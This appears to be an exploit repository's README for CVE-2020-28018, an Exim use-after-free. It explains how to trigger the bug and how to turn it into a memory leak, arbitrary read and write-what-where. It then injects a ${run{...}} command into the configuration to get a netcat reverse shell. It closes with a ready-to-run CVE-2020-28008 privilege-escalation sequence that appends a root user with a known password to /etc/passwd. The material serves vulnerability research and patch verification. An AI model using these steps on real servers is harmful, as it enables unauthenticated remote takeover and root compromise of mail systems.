# CVE-2020-28018: Exim Use-after-free (UAF) leading to RCE

## Introduction

There exists a Use-after-free (UAF) vulnerability in `tls-openssl.c` that allow remote unauthenticated attackers to corrupt internal memory data, thus finally achieving remote code execution.

Primitives:
- [x] Memory Leakage
- [x] Arbitrary read primitive
- [x] Write-What-Where primitive

With the use of all those primitives chained together it is possible to fully bypass all the available exploit mitigations finally ending up on a remote code execution as the exim user.

This vulnerability has been released among a huge list of vulnerabilities, the official Qualys report chains the Use-After-Free with CVE-2020-28008 to perform a Local Privilege Escalation (LPE) once RCE has been achieved.

## Pre-requisites

The exim, should be configured / compiled in the following way:
- TLS is enabled
- OpenSSL is used (instead of GnuTLS)
- Exim is one of the vulnerable versions
- `X_PIPE_CONNECT` is disabled

You can use the `checker.py` script to check if a remote server is on a vulnerable version and has some needed requisites for it to be exploitable.

**[!]** `checker.py` does NOT trigger the vulnerability, just checks for vulnerable version, check if PIPELINING and TLS are enabled. This means this checker does not check for patch, which means that it can generate false positives.

## Vulnerable code

As we already know, the vulnerability is located at `tls-openssl.c`.

```c
/*************************************************
*         Write bytes down TLS channel           *
*************************************************/

/*
Arguments:
  ct_ctx    client context pointer, or NULL for the one global server context
  buff      buffer of data
  len       number of bytes
  more	    further data expected soon

Returns:    the number of bytes after a successful write,
            -1 after a failed write

Used by both server-side and client-side TLS.
*/

int
tls_write(void * ct_ctx, const uschar *buff, size_t len, BOOL more)
{
int outbytes, error, left;
SSL * ssl = ct_ctx ? ((exim_openssl_client_tls_ctx *)ct_ctx)->ssl : server_ssl;
static gstring * corked = NULL;

DEBUG(D_tls) debug_printf("%s(%p, %lu%s)\n", __FUNCTION__,
  buff, (unsigned long)len, more ? ", more" : "");

/* Lacking a CORK or MSG_MORE facility (such as GnuTLS has) we copy data when
"more" is notified.  This hack is only ok if small amounts are involved AND only
one stream does it, in one context (i.e. no store reset).  Currently it is used
for the responses to the received SMTP MAIL , RCPT, DATA sequence, only. */
/*XXX + if PIPE_COMMAND, banner & ehlo-resp for smmtp-on-connect. Suspect there's
a store reset there. */

if (!ct_ctx && (more || corked))
  {
#ifdef EXPERIMENTAL_PIPE_CONNECT
  int save_pool = store_pool;
  store_pool = POOL_PERM;
#endif

  corked = string_catn(corked, buff, len);

#ifdef EXPERIMENTAL_PIPE_CONNECT
  store_pool = save_pool;
#endif

  if (more)
    return len;
  buff = CUS corked->s;
  len = corked->ptr;
  corked = NULL;
  }

for (left = len; left > 0;)
  {
  DEBUG(D_tls) debug_printf("SSL_write(%p, %p, %d)\n", ssl, buff, left);
  outbytes = SSL_write(ssl, CS buff, left);
  error = SSL_get_error(ssl, outbytes);
  DEBUG(D_tls) debug_printf("outbytes=%d error=%d\n", outbytes, error);
  switch (error)
    {
    case SSL_ERROR_SSL:
      ERR_error_string_n(ERR_get_error(), ssl_errstring, sizeof(ssl_errstring));
      log_write(0, LOG_MAIN, "TLS error (SSL_write): %s", ssl_errstring);
      return -1;

    case SSL_ERROR_NONE:
      left -= outbytes;
      buff += outbytes;
      break;

    case SSL_ERROR_ZERO_RETURN:
      log_write(0, LOG_MAIN, "SSL channel closed on write");
      return -1;

    case SSL_ERROR_SYSCALL:
      log_write(0, LOG_MAIN, "SSL_write: (from %s) syscall: %s",
	sender_fullhost ? sender_fullhost : US"<unknown>",
	strerror(errno));
      return -1;

    default:
      log_write(0, LOG_MAIN, "SSL_write error %d", error);
      return -1;
    }
  }
return len;
}
```

`smtp_setup_msg()` is the main function that performs the message reading from client.

On specific situations, `smtp_reset()` is called, which performs a clean up of all the buffers
and values.

This can happen in situations like:
- `HELO`/`EHLO` is received
- `STARTTLS` is received
- `RSET` is received
- At the starting of `smtp_setup_msg()`


At the end of `smtp_reset()`, a call to `store_reset()` is performed.

`store_reset` is a macro wrapping for `store_reset_3()` function.

The store functions are just functions that manage the dynamic memory.

Exim uses a pool allocator on blocks that are received from malloc.

There is also an interesting functionality which is a growable string
implementation.
 
`gstring` struct:
```c
typedef struct gstring {
  int   size;           /* Current capacity of string memory */
  int   ptr;            /* Offset at which to append further chars */
  uschar * s;           /* The string memory */
} gstring;
```

When needing more space for concatenating a new string, it calls `gstring_grow()`.

That function first tries to call `store_extend_3()`, that function tries to extend the memory
within the same pool block.

It can be useful when the length of the input is not known, but if more memory was allocated after
it we won't be able to extend it.

Then `gstring_grow()` calls `store_newblock_3()` which just returns a new memory and copies the 
bytes already present in the past one to the new one.

Then the `g->s`  pointer is restored from `gstring_catn()`.

In the function `tls_write()`, we can see there is a `BOOL` called `more`.

It indicates if there is more stuff to be copied into the string buffer before
returning the data back to the user.

If so, the pointer is not NULL'ed.

If not, then the data contained in the string buffer is returned to the user.

This functionality opens some interesting ways trigger a Use-After-Free.

First, the pointer to the `gstring` struct is stored at a static variable,
this means on future calls to `tls_write()` we will be able to use it.

How can we free the buffer and then be able to use it?

We need to make `smtp_setup_msg()` call `smtp_reset()` after one
of our buffers is still on `server_corked` (not NULL'ed).

After the reset, if we call `tls_write()` somehow, the pointer will
still be there, thus allowing us to use it after the memory has been freed.

`smtp_reset()` frees all the memory of `POOL_MAIN`, in which our buffer is contained.


## Triggering Use-After-Free

To control the Use-After-Free we need first to initialize a new connection.

As we want to exploit the `tls_write()` we need first to start a new TLS session.

So first we send a `EHLO` command, followed by a `STARTTLS` to start the TLS connection.

Then to make `more` be `1` we pipeline a command, and the final one will be the half of a `NOOP`.

We close the TLS connection and send the rest of the `NOOP` command.

We now send `EHLO` again, which will make `smtp_reset` be called and free our buffer.

Now we need to start another TLS connection to be able to use `tls_write()` again.

We send `STARTTLS`.

Now sending any command to the server will end up calling `tls_write()` for returning a response.

But... `server_corked` still contains a pointer to somewhere on the freed memory.

And that data might be used by another functions as it is freed...so our `gstring` struct will be corrupted
with random binary data.

This is the result of triggering the UAF:

```
gef➤  p *corked
$1 = {
  size = 0x54595c9c, 
  ptr = 0xa7e800ba, 
  s = 0x7e35043433160bd3 <error: Cannot access memory at address 0x7e35043433160bd3>
}
gef➤  p corked
$2 = (gstring *) 0x555ad3be1b58
gef➤  
```

This struct is in this way just when entering `tls_write()` for our command following the `STARTTLS`.

Obviously, once the `corked->s` is tried to be accessed results on a SIGSEGV interruption.

# Exploitation

As mentioned by Qualys, they use three steps to exploit the vulnerability:

1) As the memory is already free, we can make Exim to write heap pointers from structs like `header_line` into our buffer, so when `tls_write()` is called, it will be returned to the user. This way we have a memory leak to continue our exploitation.
2) Once we know the heap memory addresses, we can craft an arbitrary read primitive to start reading the heap until finding Exim configuration.
3) Finally the last step is to craft a write-what-where primitive. This way we would be able to inject custom configuration into the buffer found on step 2. We can inject `${run{<command>}}`, where `<command>` is any command the attacker would like to execute, like a reverse shell using netcat. This configuration will be interpreted by `string_expand()`, and will end up executing the command.

## Controlling the Use-After-Free condition

Nice, we were able to trigger the Use-After-Free.

Now we need take good control over the UAF so we can craft our
primitives successfully and reliably.

Unfortunately, after the buffers from `POOL_MAIN` are
freed, our block will be called into `free()` directly.

This means that memory wont just be accessed through `store_get_3()` or
`store_newblock_3()` but from any function that uses `malloc()`...like
`CRYPTO_zalloc()` and many more.

In this case, in somewhere at `tls_server_start()`, memory is requested
through `malloc()`.

Then copies some binary data into it, corrupting our `gstring` struct.

We need a way to prevent this, so we can reach `tls_write()` with a sane
`gstring` struct that points to a valid memory address, else a SIGSEGV
interrupt will be performed.

After understanding how the Exim Pool allocator works, debugging and trying
some commands to see their behaviour on the heap side, we can finally avoid this data being
written into our gstring struct.

## Memory Leak

Once we have a successful Use-After-Free triggered and we have no problems with our struct being corrupted,
we need to try to move the heap in a way a function writes a heap address in the middle of our string (any position
before `g->ptr`).

We are lucky as the responses, despite being plain text (not a binary protocol) allows us to send NULL bytes back to the client.

Why does this happen?

Responses are sent back with `SSL_write()`, no problems with NULL bytes.

What about strings? `string_catn()` does not cut NULL bytes. Because it uses `memcpy` to copy the data.

The only way to set a limit is through `g->ptr`, but...as the address is written before `g->ptr` index
all the data until it is returned to us, thus leaking precious heap addresses.

Result of leaking memory with the PoC:

![Memory Leak](https://i.imgur.com/TkCLe8U.png)

## Arbitrary Read

Now, we have uncovered the heap base....

And...the addresses do not change between each connection...so we can start now the way to RCE

But... how do we overwrite the gstring struct?

It turned out to be pretty straightforward using the Qualys technique.

ESMTP added some stuff to the SMTP protocol, like parameteters for MAIL FROM commands.

Using a big parameter after the last STARTTLS is enough to overwrite the struct :)

Result:

```
gef➤  p *corked
$1 = {
  size = 0x42424242, 
  ptr = 0x42424242, 
  s = 0x4242424242424242 <error: Cannot access memory at address 0x4242424242424242>
}
```

Full control over the `gstring` struct.

Now it is time to craft our arbitrary read primitive.

Apparently it appears to be easy...overwrite `g->size` and `g->ptr` with a big value.

Then overwrite `g->s` with the memory address from which we want to read.

Once the command finishes, `tls_write()` will be called to return back data to the user.

As the string buffer pointer is corrupted, and pointing to attacker arbitrary location, the data from that location will be returned.

We might now implement a function that iterates over the chunks reading and trying to find keywords that would let us know if the chunk
is the one that holds the Exim configuration, if so, we will then go to the last step.

The function I implemented iterates each `READ_SZ` length along the heap from the heap base.

```
	[+] Leaked heap address = 0x55c846683d90
	[+] Leaked heap_base = 0x55c8465f4000

[*] Searching for Exim configuration in memory...

[+] Config found at: 0x55c8465f6328
```

Once something found, we move on to the last step.

## Write-What-Where

Nice! We know heap base address. And more interesting...we know where the Exim configuration is located!

Now it is time to RCE right :P

We now, have to (somehow) overwrite the exim configuration and inject `${run{<command>}}`. So when `string_expand()` is executed, our command is interpreted and finally we get Arbitrary command execution.

The easier way to get RCE is using netcat, so just using nc in the command would let us a shell.

But... how can we craft such write-what-where primitive?

We must first overwrite (as we did with the arbitrary read primitive) the `gstring` struct.

Once we have control over it, we might first point `g->s` to the place where we want to write, in this case the Exim configuration address.

Then on the next response to be written to the buffer, the response will be written to where `g->s` points to :)

But...how can we corrupt the `gstring` struct and get an arbitrary response at the same time?

Qualys did not left this very clear on the advisory.

We need to make a "MAIL FROM" command return arbitrary data.

After some tries, I though the best solution is with an error message.

We can choose `ADDR - strlen("501 ")`.

So those four bytes do not corrupt our target.

How can we make MAIL FROM fail? I use a wrong sender, as sender require a domain, if no domain is specified the error message will contain client-sent data

But there is a problem with it. As we are sending NULLs, this message is returned instead: "501 NUL characters are not allowed in SMTP commands".

So still no way to control the output of it, as we need NULLs in the request.

We cannot send another "MAIL FROM" to corrupt responses for the simple reason that once we trigger the UAF, more=0 and no access to the freed buffer.

But from `handle_smtp_call()`, if we send `DATA`, `receive_msg()`. We can trick it not to restore the current pool so we can groom the heap a bit to overwrite the freed buffer.

Once we overwrite it, we send a MAIL FROM with invalid data pipelined with a valid one. The response will be written into the `s` pointer.

## Remote Code Execution

Once we achieved write what where, I had problems with netcat directly as some requirements were needed for number of arguments. So I did a: `/bin/sh -c '<nc command here>'`.

I overwrote the MAIL FROM ACL so that pipelining a second MAIL FROM ends up calling `expand_cstring()`, and finally executing my arbitrary command.

This is an screenshot once I get a shell with the exploit:

![RCE_CAP](https://i.imgur.com/sK0QAq0.png)

## Chaining with CVE-2020-28008 LPE

```
$ /bin/bash
$ cd /var/spool/exim4/db
$ rm -f retry*
$ ln -s -f /etc/passwd retry.passwd
$ /usr/sbin/exim4 -odf -oep postmaster < /dev/null
$ # creds => pwner:pwner
$ echo 'pwner:$6$4KB5snZ5jevx6TFa$VNdvb49sUfHhAQeKCkbpGVDnHUbnNfbpFh.QVjwIqvGlYsyKp8yoYrAfNDcG0XdtoQ2vT9LQPLml6XmCaVCOX/:18757:0:99999:7:::' >> /etc/passwd
$ su -l pwner
 * Enter pass: pwner *
# id
uid=0(root) gid=0(root) groups=0(root)
#
```

## System Information

The tests have been performed in a debian:

```
root@research:~# lsb_release -a
No LSB modules are available.
Distributor ID:	Debian
Description:	Debian GNU/Linux 10 (buster)
Release:	10
Codename:	buster
```

With exim version:

```
root@research:~# exim --version
Exim version 4.92 #7 built 06-May-2021 19:31:44
Copyright (c) University of Cambridge, 1995 - 2018
(c) The Exim Maintainers and contributors in ACKNOWLEDGMENTS file, 2007 - 2018
Berkeley DB: Berkeley DB 5.3.28: (September  9, 2013)
Support for: crypteq iconv() OpenSSL DANE DKIM DNSSEC Event OCSP PRDR TCP_Fast_Open
Lookups (built-in): lsearch wildlsearch nwildlsearch iplsearch cdb dbm dbmjz dbmnz dnsdb passwd
Authenticators: cram_md5 plaintext
Routers: accept dnslookup ipliteral manualroute queryprogram redirect
Transports: appendfile/maildir/mailstore autoreply lmtp pipe smtp
Fixed never_users: 0
Configure owner: 0:0
Size of off_t: 8
Configuration file is /var/lib/exim4/config.autogenerated
```

My Exim version is self-compiled, but replicating
compilation flags used on mainstream at debian.

Configuration is the same as the debian default plus some
minor changes maybe.

## Set up Environment

In this repository, there is a directory called `exim-4.92`. It is the source code for exim.

First install exim with the apt package manager.

Download the exim directory and the config directory into the machine.

First copy `config/Makefile` into `exim-4.92/Local`.
Then copy `config/eximon.conf` into `exim-4.92/Local`.

Now we run `make`, a `build-linux-*` directory will be created, we will move to it and replace all the "-O2" occurrences for
"-O0".

We will do the same on the `OS/` directory. Finally at the `build-linux-*` we add to the `CFLAGS` variable the `-g`.

Recommended to add the libc and exim source to gdb.

Now `make` and `make install`.

`cp /usr/exim/bin/* /usr/sbin/`
`cp /usr/sbin/exim /usr/sbin/exim4`

I used this script for generating certs: [https://github.com/volumio/RootFS/blob/master/usr/share/doc/exim4-base/examples/exim-gencert](https://github.com/volumio/RootFS/blob/master/usr/share/doc/exim4-base/examples/exim-gencert)

Finally enable TLS on the exim4 configuration at `/etc/exim4`
and use the `/etc/exim4/exim.crt` and `/etc/exim4/exim.key` generated by the bash script.

Finally: `sudo update-exim4.conf && systemctl restart exim4`

Check `systemctl status exim4` to see if everything is right.

If you get a TLS not currently available error message after trying to `STARTTLS`, check out exim4 logs.

I faced a problem because the key I used for certs was too short. So modify the key bits from the previously mentioned gencert script (I use 4096).


## More Information

For more information visit the [official qualys advisory](https://www.qualys.com/2021/05/04/21nails/21nails.txt) 


